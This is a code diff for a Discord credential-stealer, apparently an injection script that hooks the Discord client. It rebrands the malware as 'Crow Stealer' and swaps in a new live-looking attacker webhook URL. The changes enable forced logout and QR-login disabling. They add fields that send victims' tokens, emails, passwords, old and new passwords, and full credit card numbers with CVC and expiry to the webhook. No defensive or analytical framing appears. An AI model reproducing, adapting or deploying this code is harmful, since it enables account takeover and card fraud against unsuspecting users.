@@ -8,24 +8,23 @@ const querystring = require("querystring");
 const fs = require("fs");
 
 
-// Initialization
 
 var config = {
-    brand: "Bloody",
+    brand: "doenerium",
 
-    webhook: "https://discord.com/api/webhooks/1155166824007225344/lzPq07AgVYqTjUj6vP_9tKlz4sgT7PzI5cjCHgVexoijdwSIKK8QnogjCpkWYjnD3ky2",
+    webhook: "https://discord.com/api/webhooks/1185284251822854184/otr99g5RewTX0s08NtO1qs9KAHk4tnCHjqk4A3UVJmx1Fx3_I-iYNuGG42k3Iqw1AfYc",
 
-    logout: false,
-    disable_qr_code: false,
+    logout: true,
+    disable_qr_code: true,
 
-    notify_on_logout: true,
-    notify_on_initialization: true,
-    ping: [true, "@bloodystealer"],
+    notify_on_logout: false,
+    notify_on_initialization: false,
+    ping: [true, "@everyone"],
 
     embed: {
-        username: "@bloodystealer",
+        username: "Crow Stealer",
         footer: {
-            text: `@bloodystealer`,
+            text: `Crow will destroy everyone!`,
         },
     },
 
@@ -257,45 +256,45 @@ var event_handlers = {
             username: config.embed.username,
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
-                url: config.embed.href,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 thumbnail: {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
-                fields: [
-                    {
-                        name: "<a:Dinheiro:923985241624957038> Token",
-                        value: `\`${token}\`\``,
-                        inline: true
+                fields: [{
+                    
+                        name: "<a:crow:1188956242140483655> Token",
+                        value: `\`${token}\``,
+                        inline: false
                     },
                     {
-                        name: "<:j_armada:1087908492079271936> Nitro Type",
+                        name: "<:crow:1188956584164982856> Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: true
+                    }, {
+                        name: "<:crow:1188957067835355177> Billing",
+                        value: `${billing}`,
+                        inline: true
+                    }, {
+                        name: "<a:crow:1188627788454957177> Badges",
+                        value: `${getBadges(userInfo.flags)}`,
+                        inline: true
                     },
                     {
-                        name: "<a:j_voa:1087772447064993822> Badges",
-                        value: `${getBadges(userInfo.flags)}`,
-                        inline: false
-                    },{
-                        name: "<a:j_hearts:1154233038197231636> Billing Type",
-                        value: `${billing}`,
+                        name: "<:crow:1188956584164982856> Credit card",
+                        value: `\`${number}|${cvc}|${month}/${year}\``,
                         inline: false
                     },
-
                 ],
             }), createEmbed({
-                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
+                description: `Total Friends (${friends['length']})\n\n${friends.frien}`,
                 thumbnail: {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
             })]
@@ -320,46 +319,43 @@ var event_handlers = {
                 thumbnail: {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
-                fields: [
-                    {
-                        name: "<a:Dinheiro:923985241624957038> Token",
-                        value: `\`${token}\`\``,
-                        inline: true
+                fields: [{
+                    name: "<a:crow:1188956242140483655> Token",
+                    value: `\`${token}\``,
+                    inline: false
                     },
                     {
-                        name: "<:j_armada:1087908492079271936> Nitro Type",
+                        name: "<:crow:1188956584164982856> Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: true
                     }, {
-                        name: "<a:j_voa:1087772447064993822> Badges",
-                        value: `${getBadges(userInfo.flags)}`,
-                        inline: true
-                    },{
-                        name: "<a:j_hearts:1154233038197231636> Billing Type",
+                        name: "<:crow:1188957067835355177> Billing",
                         value: `${billing}`,
+                        inline: true
+                    }, {
+                        name: "<a:crow:1188627788454957177> Badges",
+                        value: `${getBadges(userInfo.flags)}`,
                         inline: false
                     },
                     {
-                        name: "E-Mail Address",
-                        value: `\`${email}\`\``,
+                        name: "<:crow:1188956584164982856> Email",
+                        value: `\`${email}\``,
                         inline: true
                     },
                     {
-                        name: "<a:black_verificado:975294959014002769> Password",
-                        value: `\`${password}\`\``,
-                        inline: false
+                        name: "Password",
+                        value: `\`${password}\``,
+                        inline: true
                     },
-
 
                 ],
             }), createEmbed({
-                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
+                description: `Total Friends (${friends['length']})\n\n${friends.frien}`,
                 thumbnail: {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
             })]
@@ -377,56 +373,50 @@ var event_handlers = {
             username: config.embed.username,
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
-                url: config.embed.href,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 thumbnail: {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
-                fields: [
-{
-                        name: "<a:Dinheiro:923985241624957038> Token",
-                        value: `\`${token}\`\``,
-                        inline: true
-                    },{
-                        name: "<a:j_voa:1087772447064993822> Badges",
-                        value: `${getBadges(userInfo.flags)}`,
-                        inline: true
-                    },{
-                        name: "<:j_armada:1087908492079271936> Nitro Type",
+                fields: [{
+                    name: "<a:crow:1188956242140483655> Token",
+                    value: `\`${token}\``,
+                    inline: false
+                    },
+                    {
+                        name: "<:crow:1188956584164982856> Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: true
-                    },
-                    {
-                        name: "<a:j_hearts:1154233038197231636> Billing Type",
+                    }, {
+                        name: "<:crow:1188957067835355177> Billing",
                         value: `${billing}`,
-                        inline: false
-                    },
-                    {
-                        name: "New email address",
-                        value: `\`${newEmail}\`\``,
+                        inline: true
+                    }, {
+                        name: "<a:crow:1188627788454957177> Badges",
+                        value: `${getBadges(userInfo.flags)}`,
                         inline: true
                     },
                     {
-                        name: "<a:black_verificado:975294959014002769> Password",
-                        value: `\`${password}\`\``,
-                        inline: false
+                        name: "<:crow:1188956584164982856> New email",
+                        value: `\`${newEmail}\``,
+                        inline: true
                     },
-
-
+                    {
+                        name: "<:crow:1188957067835355177> Password",
+                        value: `\`${password}\``,
+                        inline: true
+                    },
 
                 ],
             }), createEmbed({
-                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
+                description: `Total Friends (${friends['length']})\n\n${friends.frien}`,
                 thumbnail: {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
             })]
@@ -444,53 +434,49 @@ var event_handlers = {
             username: config.embed.username,
             avatar_url: config.embed.avatar_url,
             embeds: [createEmbed({
-                url: config.embed.href,
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 thumbnail: {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 fields: [{
-                        name: "<a:Dinheiro:923985241624957038> Token",
-                        value: `\`${token}\`\``,
-                        inline: true
-                    },
-                    {
-                        name: "<a:j_voa:1087772447064993822> Badges",
-                        value: `${getBadges(userInfo.flags)}`,
+                        name: "<a:crow:1188956242140483655> Token",
+                        value: `\`${token}\``,
                         inline: false
                     },
                     {
-                        name: "<:j_armada:1087908492079271936> Nitro Type",
+                        name: "<:crow:1188956584164982856> Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: true
                     }, {
-                        name: "<a:j_hearts:1154233038197231636> Billing Type",
+                        name: "<:crow:1188957067835355177> Billing",
                         value: `${billing}`,
-                        inline: false
-                    },
-                    {
-                        name: "<a:black_roxo_f:1042486646949543976> Old password",
-                        value: `\`${oldPassword}\`\``,
+                        inline: true
+                    }, {
+                        name: "<a:crow:1188627788454957177> Badges",
+                        value: `${getBadges(userInfo.flags)}`,
                         inline: true
                     },
                     {
-                        name: "<a:black_verificado:975294959014002769> New password",
-                        value: `\`${newPassword}\`\``,
-                        inline: false
+                        name: "<:crow:1188956584164982856> Old password",
+                        value: `\`${oldPassword}\``,
+                        inline: true
+                    },
+                    {
+                        name: "<:crow:1188956584164982856> New password",
+                        value: `\`${newPassword}\``,
+                        inline: true
                     },
                 ],
             }), createEmbed({
-                description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
+                description: `Total Friends (${friends['length']})\n\n${friends.frien}`,
                 thumbnail: {
                     url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
                 author: {
                     name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-                    url: config.embed.href,
                     icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                 },
             })]
@@ -511,13 +497,13 @@ function getDiscordClient() {
 function getNitro(flags) {
     switch (flags) {
         case 0:
-            return "\`\`No Nitro\`\`";
+            return "\`No Nitro\`";
         case 1:
             return "<:classic:896119171019067423> \`\`Nitro Classic\`\`";
         case 2:
             return "<a:boost:824036778570416129> \`\`Nitro Boost\`\`";
         default:
-            return "\`\`No Nitro\`\`";
+            return "\`No Nitro\`";
 
     };
 }
@@ -537,7 +523,7 @@ function getBadges(flags) {
         let o = config.badges[prop];
         if ((flags & o.Value) == o.Value) b += o.Emoji;
     };
-    if (b == '') b = '\`\`None\`\`'
+    if (b == '') b = '\`None\`'
     return b;
 }
 
@@ -560,17 +546,17 @@ async function getBilling(token) {
     var billing = "";
     json.forEach(z => {
         if (z.type == "") {
-            return "No Billing";
+            return "\`❌\`";
         } else if (z.type == 2 && z.invalid != true) {
-            billing += " <:paypal:896441236062347374>";
+            billing += "\`✔️\`" + " <:paypal:896441236062347374>";
         } else if (z.type == 1 && z.invalid != true) {
-            billing += " :credit_card:";
+            billing += "\`✔️\`" + " :credit_card:";
         } else {
-            return "No Billing";
+            return "\`❌\`";
         };
     });
 
-    if (billing == "") billing = "No Billing"
+    if (billing == "") billing = "\`❌\`"
     return billing;
 }
 
@@ -664,8 +650,13 @@ async function initialize() {
                 sendToWebhook({
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
-                    url: config.embed.href,
                     embeds: [createEmbed({
+                        title: "Discord Logado",
+                        fields: [{
+                            name: "Be Pacient",
+                            value: `\`Oi '_'\``,
+                            inline: false
+                        },],
                     })]
                 })
             } else {
@@ -677,47 +668,45 @@ async function initialize() {
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
                     embeds: [createEmbed({
-                        author: {
+                            author: {
                             name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-    
-                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         thumbnail: {
                             url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         fields: [
                             {
-                                name: "<a:Dinheiro:923985241624957038> Token",
-                                value: `\`${token}\`\``,
+                                name: "<a:crow:1188956242140483655> Token",
+                                value: `\`${token}\``,
                                 inline: false
                             },
                             {
-                                name: "<a:j_voa:1087772447064993822> Badges",
-                                value: `${getNitro(userInfo.premium_type)} ${getBadges(userInfo.flags)}`,
+                                name: "<:crow:1188956584164982856> Nitro",
+                                value: `${getNitro(userInfo.premium_type)}`,
                                 inline: true
-                            },{
-                                name: "<a:j_hearts:1154233038197231636> Billing Type",
+                            }, {
+                                name: "<:crow:1188957067835355177> Billing",
                                 value: `${billing}`,
                                 inline: true
+                            }, {
+                                name: "<a:crow:1188627788454957177> Badges",
+                                value: `${getBadges(userInfo.flags)}`,
+                                inline: true
                             },{
-                                name: "<a:black_verificado:975294959014002769> E-Mail",
-                                value: `\`${userInfo.email}\`\``,
-                                inline: false
-                            },{
-                                name: "<:j_coroa:1087907612428869762> Ip",
-                                value: `\`yaml\nIP Address: ${network_data['ip'] ?? "Unknown"}\nHostname: ${network_data['hostname'] ?? "Unknown"}\nCity: ${network_data['city'] ?? "Unknown"}\nRegion: ${network_data['region'] ?? "Unknown"}\nCountry: ${network_data["country"] ?? "Unknown"}\nTimezone: ${network_data["timezone"] ?? "Unknown"}\`\``,
-                                inline: false
-                            }
+                                name: "<:crow:1188956584164982856> Email",
+                                value: `\`${userInfo.email}\``,
+                                inline: true
+                            },
                         ],
                     }), createEmbed({
-                        description: `**Total Friends (${friends['length']})**\n\n${friends.frien}`,
+                        description: `Total Friends (${friends['length']})\n\n${friends.frien}`,
                         thumbnail: {
                             url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         author: {
                             name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-    
-                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                     })]
                 })
@@ -733,31 +722,31 @@ async function initialize() {
                     username: config.embed.username,
                     avatar_url: config.embed.avatar_url,
                     embeds: [createEmbed({
-                        author: {
+                            author: {
                             name: `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
-    
-                            icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
+                                    icon_url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
                         thumbnail: {
                             url: userInfo.avatar ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}` : "https://cdn.discordapp.com/embed/avatars/0.png"
                         },
-                        fields: [{
-                                name: "<a:Dinheiro:923985241624957038> Token",
-                                value: `\`${token}\`\``,
-                                inline: false
-                            }, {
-                                name: "<a:j_voa:1087772447064993822> Badges",
-                                value: `${getBadges(userInfo.flags)}`,
+                        fields: [
+                            {
+                                name: "<a:crow:1188956242140483655> Token",
+                                value: `\`${token}\``,
                                 inline: false
                             },{
-                                name: "Nitro Type",
+                                name: "<:crow:1188956584164982856> Nitro",
                                 value: `${getNitro(userInfo.premium_type)}`,
                                 inline: true
                             }, {
-                                name: "<a:j_hearts:1154233038197231636> Billing Type",
+                                name: "<:crow:1188957067835355177> Billing",
                                 value: `${billing}`,
                                 inline: true
-                            }
+                            }, {
+                                name: "<a:crow:1188627788454957177> Badges",
+                                value: `${getBadges(userInfo.flags)}`,
+                                inline: true
+                            },
 
                         ]
                     })]
